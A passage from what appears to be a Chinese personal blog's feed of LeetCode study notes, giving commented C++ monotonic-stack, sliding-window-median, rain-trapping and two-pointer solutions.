i=nums2.<span class="built_in">size</span>()<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;<span class="comment">//倒叙遍历nums2</span></span><br><span class="line">            <span class="keyword">int</span> num = nums2[i];</span><br><span class="line">            <span class="keyword">while</span>(!stk.<span class="built_in">empty</span>() &amp;&amp; num&gt;=stk.<span class="built_in">top</span>())&#123;<span class="comment">//当前元素大于 栈顶元素</span></span><br><span class="line">                stk.<span class="built_in">pop</span>();<span class="comment">//弹出 栈中比当前元素小的 元素</span></span><br><span class="line">            &#125;</span><br><span class="line">            hashmap[num] = stk.<span class="built_in">empty</span>()?<span class="number">-1</span>:stk.<span class="built_in">top</span>();<span class="comment">//将每个元素对应的 最大元素存于哈希表中</span></span><br><span class="line">            stk.<span class="built_in">push</span>(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">res</span><span class="params">(nums1.size())</span></span>;<span class="comment">//结果存放</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums1.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            res[i] = hashmap[nums1[i]];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="503-下一个更大元素-II——循环数组"><a href="#503-下一个更大元素-II——循环数组" class="headerlink" title="503 下一个更大元素 II——循环数组"></a>503 下一个更大元素 II——循环数组</h3><p><strong>循环搜寻</strong><br>给定一个循环数组 nums（nums[nums.length-1] 的下一个元素是 nums[0] ），返回 nums 中每个元素的 下一个更大元素 。<br>数字 x 的 下一个更大的元素 是按数组遍历顺序，这个数字之后的第一个比它更大的数，这意味着你应该循环地搜索它的下一个更大的数。如果不存在，则输出 -1 。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    单调栈 + 循环数组O(n)</span></span><br><span class="line"><span class="comment">    返回：值，下标</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">nextGreaterElements</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">ret</span><span class="params">(n,<span class="number">-1</span>)</span></span>;</span><br><span class="line">        stack&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n*<span class="number">2</span><span class="number">-1</span>;i++)&#123;<span class="comment">//遍历两遍</span></span><br><span class="line">            <span class="keyword">while</span>(!stk.<span class="built_in">empty</span>() &amp;&amp; nums[stk.<span class="built_in">top</span>()]&lt;nums[i%n])&#123;</span><br><span class="line">                ret[stk.<span class="built_in">top</span>()] = nums[i%n];</span><br><span class="line">                stk.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            stk.<span class="built_in">push</span>(i%n);<span class="comment">//栈中存放的是 下标</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="480-滑动窗口中位数"><a href="#480-滑动窗口中位数" class="headerlink" title="480 滑动窗口中位数"></a>480 滑动窗口中位数</h3><p>【<strong>中位数</strong>】：是【有序序列】【最中间】的那个数。<br>如果序列的长度是偶数，则没有最中间的数；此时中位数是最中间的两个数的平均数。</p><pre><code>[2,3,4]，中位数是 3[2,3]，中位数是 (2 + 3) / 2 = 2.5</code></pre><p><img src="https://img-blog.csdnimg.cn/6c455fcdc8b24812ab49bff1d6e3d23a.png"><br><strong>动态维护数组的中位数</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    priority_queue&lt;<span class="keyword">int</span>&gt; small;</span><br><span class="line">    priority_queue&lt;<span class="keyword">int</span>, vector&lt;<span class="keyword">int</span>&gt;, greater&lt;<span class="keyword">int</span>&gt; &gt; big;</span><br><span class="line">    unordered_map&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; mp;</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span>&amp; k)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(k%<span class="number">2</span>) <span class="keyword">return</span> small.<span class="built_in">top</span>();</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in"><span class="keyword">return</span></span> ((<span class="keyword">long</span> <span class="keyword">long</span>)small.<span class="built_in">top</span>()+big.<span class="built_in">top</span>())*<span class="number">0.5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">double</span>&gt; <span class="title">medianSlidingWindow</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++)&#123;small.<span class="built_in">push</span>(nums[i]);&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k / <span class="number">2</span>; i++)&#123;big.<span class="built_in">push</span>(small.<span class="built_in">top</span>()); small.<span class="built_in">pop</span>();&#125;</span><br><span class="line">        vector&lt;<span class="keyword">double</span>&gt; ans&#123;<span class="built_in">get</span>(k)&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = k; i &lt; nums.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> balance = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> l = nums[i-k];</span><br><span class="line">            mp[l]++;</span><br><span class="line">            <span class="keyword">if</span>(!small.<span class="built_in">empty</span>() &amp;&amp; l&lt;=small.<span class="built_in">top</span>())&#123;balance--;&#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;balance++;&#125;</span><br><span class="line">            <span class="keyword">if</span>(!small.<span class="built_in">empty</span>() &amp;&amp; nums[i] &lt;= small.<span class="built_in">top</span>())&#123;</span><br><span class="line">                small.<span class="built_in">push</span>(nums[i]);</span><br><span class="line">                balance++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                big.<span class="built_in">push</span>(nums[i]);</span><br><span class="line">                balance--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(balance&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                big.<span class="built_in">push</span>(small.<span class="built_in">top</span>());</span><br><span class="line">                small.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(balance&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                small.<span class="built_in">push</span>(big.<span class="built_in">top</span>());</span><br><span class="line">                big.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(!small.<span class="built_in">empty</span>() &amp;&amp; mp[small.<span class="built_in">top</span>()]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                mp[small.<span class="built_in">top</span>()]--;</span><br><span class="line">                small.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(!big.<span class="built_in">empty</span>() &amp;&amp; mp[big.<span class="built_in">top</span>()]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                mp[big.<span class="built_in">top</span>()]--;</span><br><span class="line">                big.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            ans.<span class="built_in">push_back</span>(<span class="built_in">get</span>(k));</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="739-每日温度"><a href="#739-每日温度" class="headerlink" title="739 每日温度"></a>739 每日温度</h3><p>给定一个整数数组 temperatures ，表示每天的温度，返回一个数组 answer ，其中 answer[i] 是指对于第 i 天，下一个更高温度出现在<strong>几天后</strong>【返回距离】。如果气温在这之后都不会升高，请在该位置用 0 来代替。<br>示例 1:<br>输入: temperatures = [73,74,75,71,69,72,76,73]<br>输出: [1,1,4,2,1,1,0,0]</p><p><strong>【单调栈】：</strong><br><strong>找到某元素左边 和 右边 第一个比它 大或小的元素。</strong></p><ul><li>求右边|左边 最近 【最大】的元素：递增栈</li><li>求右边|左边 最近 【最小】的元素：递减栈<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    单调栈：存下标、递增    小------&gt;大</span></span><br><span class="line"><span class="comment">    记录之前遍历过的元素，与当前元素作个对比</span></span><br><span class="line"><span class="comment">    当遍历到当前元素时t[i]</span></span><br><span class="line"><span class="comment">    if(t[i]&gt;stk.top())//对于下标是stk.top()的元素来说，已经找到了元素t[i]比它大了，则进行装入结果集</span></span><br><span class="line"><span class="comment">    &#123;   res[stk.top()]=i-stk.top();</span></span><br><span class="line"><span class="comment">        stk.pop();&#125;//应该弹出，因为该栈顶元素已经有了结果了，为了保证单调栈是递增的！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dailyTemperatures</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = t.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>) <span class="keyword">return</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        stack&lt;<span class="keyword">int</span>&gt; stk;<span class="comment">//单调递增栈：记录下标</span></span><br><span class="line">        stk.<span class="built_in">push</span>(<span class="number">0</span>);<span class="comment">//装入下标0</span></span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">res</span><span class="params">(n,<span class="number">0</span>)</span></span>;<span class="comment">//这里直接初始化0，后面不用再写</span></span><br><span class="line">        <span class="keyword">while</span>(i&lt;n)&#123;</span><br><span class="line">            <span class="keyword">while</span>(!stk.<span class="built_in">empty</span>() &amp;&amp; t[i]&gt;t[stk.<span class="built_in">top</span>()])&#123;<span class="comment">//注意判断顺序！ 并且 是while</span></span><br><span class="line">                res[stk.<span class="built_in">top</span>()] = i-stk.<span class="built_in">top</span>();<span class="comment">//距离集</span></span><br><span class="line">                stk.<span class="built_in">pop</span>();<span class="comment">//弹出</span></span><br><span class="line">            &#125;</span><br><span class="line">            stk.<span class="built_in">push</span>(i);<span class="comment">//装入</span></span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        while(!stk.empty())&#123;//最后还在栈中的 下标元素 说明找不到下一个比它大的元素</span></span><br><span class="line"><span class="comment">            res[stk.top()] = 0;</span></span><br><span class="line"><span class="comment">            stk.pop();//弹出</span></span><br><span class="line"><span class="comment">        &#125;*/</span></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="42-接雨水"><a href="#42-接雨水" class="headerlink" title="42 接雨水"></a>42 接雨水</h3>给定 n 个非负整数表示每个宽度为 1 的柱子的高度图，计算按此排列的柱子，下雨之后能接多少雨水。<br><img src="https://img-blog.csdnimg.cn/d141be2108164ed4a2971409ad35bda0.png"></li></ul><p><strong>分析：</strong><br>每个柱子能盛水的深度，取决于【**min(左边最高，右边最高)**】<br><img src="https://img-blog.csdnimg.cn/0f62d3276e7a4aa38e8080d1bf246b29.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划 O(n) O(n)</span></span><br><span class="line"><span class="comment">    预处理 leftMax(n)和rightMax(n)</span></span><br><span class="line"><span class="comment">    ans += min(leftMax[i],rightMax[i])-height[i];</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">trap</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; height)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = height.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">leftMax</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="comment">//从左向右遍历</span></span><br><span class="line">        leftMax[<span class="number">0</span>] = height[<span class="number">0</span>];<span class="comment">//从头[0]开始</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            leftMax[i] = <span class="built_in">max</span>(leftMax[i<span class="number">-1</span>],height[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">rightMax</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="comment">//从右向左遍历</span></span><br><span class="line">        rightMax[n<span class="number">-1</span>] = height[n<span class="number">-1</span>];<span class="comment">//从[n-1]尾开始</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-2</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            rightMax[i] = <span class="built_in">max</span>(rightMax[i+<span class="number">1</span>],height[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;<span class="comment">//记录结果</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            ans += <span class="built_in">min</span>(leftMax[i],rightMax[i])-height[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    双指针  O(n) O(1)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">trap</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; height)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>, r = height.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> lMax = <span class="number">0</span>, rMax = <span class="number">0</span>;<span class="comment">//赋初值</span></span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(l&lt;r)&#123;</span><br><span class="line">            lMax = <span class="built_in">max</span>(height[l],lMax);</span><br><span class="line">            rMax = <span class="built_in">max</span>(height[r],rMax);</span><br><span class="line">            <span class="keyword">if</span>(height[l]&gt;=height[r])&#123;</span><br><span class="line">                ans += rMax-height[r];</span><br><span class="line">                r--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                ans += lMax-height[l];</span><br><span class="line">                l++;</span><br><span class="line">            &#125;   </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//单调栈</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">trap</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; h)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = h.<span class="built_in">size</span>();</span><br><span class="line">        stack&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">        <span class="keyword">if</span>(n&gt;=<span class="number">0</span>) stk.<span class="built_in">push</span>(<span class="number">0</span>);<span class="comment">//单调递增栈，存下标</span></span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;<span class="comment">//记录结果和</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">while</span>(!stk.<span class="built_in">empty</span>() &amp;&amp; h[i]&gt;h[stk.<span class="built_in">top</span>()])&#123;</span><br><span class="line">                <span class="keyword">int</span> mid = stk.<span class="built_in">top</span>();<span class="comment">//中间位置下标</span></span><br><span class="line">                stk.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span>(!stk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                    <span class="keyword">int</span> height = <span class="built_in">min</span>(h[stk.<span class="built_in">top</span>()],h[i]) - h[mid];<span class="comment">//重点</span></span><br><span class="line">                    <span class="keyword">int</span> w = i-stk.<span class="built_in">top</span>()<span class="number">-1</span>;<span class="comment">//注意！w不是1</span></span><br><span class="line">                    sum += height*w;</span><br><span class="line">                &#125;    </span><br><span class="line">            &#125;</span><br><span class="line">            stk.<span class="built_in">push</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="84-柱状图中最大的矩形"><a href="#84-柱状图中最大的矩形" class="headerlink" title="84 柱状图中最大的矩形"></a>84 柱状图中最大的矩形</h3><p>给定 n 个非负整数，用来表示柱状图中各个柱子的高度。每个柱子彼此相邻，且宽度为 1 。<br>求在该柱状图中，能够勾勒出来的矩形的最大面积。<br><img src="https://img-blog.csdnimg.cn/bf0277dca0924427aaede3eb9705080c.png"><br><strong>思路：</strong><br>以每个柱子为基准，寻找其左右两边比其高度【还要小】的柱子，如果存在，则只能以较小的那个高度计算。<br>eg: 对于高度为6的柱子来说，其左边存在比6小的柱子5，右边存在比6小的柱子2，那么以6为基准，两边所能扩展的面积是5*2=10.<br><strong>本题：【单调递减栈】求左边和右边第一个比其小的元素</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//不是特别理解！！！</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">largestRectangleArea</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; h)</span> </span>&#123;</span><br><span class="line">        stack&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">        h.<span class="built_in">insert</span>(h.<span class="built_in">begin</span>(), <span class="number">0</span>); <span class="comment">//数组头部加入元素0</span></span><br><span class="line">        h.<span class="built_in">push_back</span>(<span class="number">0</span>);         <span class="comment">//数组尾部加入元素0</span></span><br><span class="line">        <span class="keyword">int</span> n = h.<span class="built_in">size</span>();<span class="comment">//新的n</span></span><br><span class="line">        <span class="keyword">if</span>(n&gt;=<span class="number">0</span>) stk.<span class="built_in">push</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;<span class="comment">//记录结果</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;<span class="comment">//从1开始</span></span><br><span class="line">            <span class="keyword">while</span>(!stk.<span class="built_in">empty</span>() &amp;&amp; h[i]&lt;h[stk.<span class="built_in">top</span>()])&#123;<span class="comment">//单调递减栈</span></span><br><span class="line">                <span class="keyword">int</span> mid = stk.<span class="built_in">top</span>();</span><br><span class="line">                stk.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span>(!stk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                    <span class="keyword">int</span> height = h[mid];</span><br><span class="line">                    <span class="keyword">int</span> w = i-stk.<span class="built_in">top</span>()<span class="number">-1</span>;</span><br><span class="line">                  <span class="comment">//  cout &lt;&lt; &quot;height:&quot;&lt;&lt;height&lt;&lt;&quot; w:&quot;&lt;&lt;w&lt;&lt;&quot; res:&quot;&lt;&lt;height*w&lt;&lt;endl;</span></span><br><span class="line">                    res = <span class="built_in">max</span>(res,height*w);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            stk.<span class="built_in">push</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="力扣刷题" scheme="https://xizhi-future.github.io/categories/%E5%8A%9B%E6%89%A3%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="力扣" scheme="https://xizhi-future.github.io/tags/%E5%8A%9B%E6%89%A3/"/>
    
  </entry>
  
  <entry>
    <title>二、双指针</title>
    <link href="https://xizhi-future.github.io/2025/12/03/%E4%BA%8C%E3%80%81%E5%8F%8C%E6%8C%87%E9%92%88/"/>
    <id>https://xizhi-future.github.io/2025/12/03/%E4%BA%8C%E3%80%81%E5%8F%8C%E6%8C%87%E9%92%88/</id>
    <published>2025-12-03T06:10:56.000Z</published>
    <updated>2025-12-03T06:11:42.321Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="、双指针"><a href="#、双指针" class="headerlink" title="、双指针"></a>、双指针</h2><ul><li>32是空格</li><li>48～57：0-9</li><li>65～90：A-Z</li><li>97～122：a-z 【差32】</li></ul><h3 id="1-有序数组的-Two-Sum"><a href="#1-有序数组的-Two-Sum" class="headerlink" title="1 有序数组的 Two Sum"></a>1 有序数组的 Two Sum</h3><p>在该数组中找出和为目标值的那两个整数，并返回他们的数组下标</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    双指针: 右上角 倒三角，每次排除一行或者一列空间</span></span><br><span class="line"><span class="comment">    搜索空间O(n)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; numbers, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> j=numbers.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">            <span class="keyword">int</span> sum = numbers[i]+numbers[j];</span><br><span class="line">            <span class="keyword">if</span>(sum&lt;target)</span><br><span class="line">                i++;</span><br><span class="line">            <span 